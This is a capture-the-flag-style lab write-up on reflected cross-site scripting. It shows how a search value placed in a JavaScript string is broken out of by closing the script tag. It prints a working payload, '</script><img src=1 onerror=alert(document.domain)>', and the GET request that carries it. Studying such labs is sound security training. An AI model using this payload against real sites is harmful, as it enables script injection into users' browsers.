### Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped

This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality.  

The reflection occurs inside a JavaScript string with single quotes and backslashes escaped.

To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function.

_____

Analysis and Exploit:

1. Performed a test search using string TESTSEARCH. The XSS context is within the followin Javascript block of code
```html
<script>
var searchTerms = 'TESTSEARCH';
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```

2. Inject the following payload
```html
</script><img src=1 onerror=alert(document.domain)>
```

DOM structure

```html
<script>
var searchTerms = '</script><img src=1 onerror=alert(document.domain)>';
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```

This payload works because browsers first parse the HTML structure to identify code blocks and only then perform Javascript parsing to understand and execute embedded scripts.  
The payload closes the script block (```</script>```) leaving it unbroken but since the former closing tag is still present, the browser still performs all the actions.  
The onerror event is triggered because there is no image named "1" among the resources.

_____

Script notes:

2. GET /?search=[```</script><img src=1 onerror=alert(document.domain)>```, URLeconded]

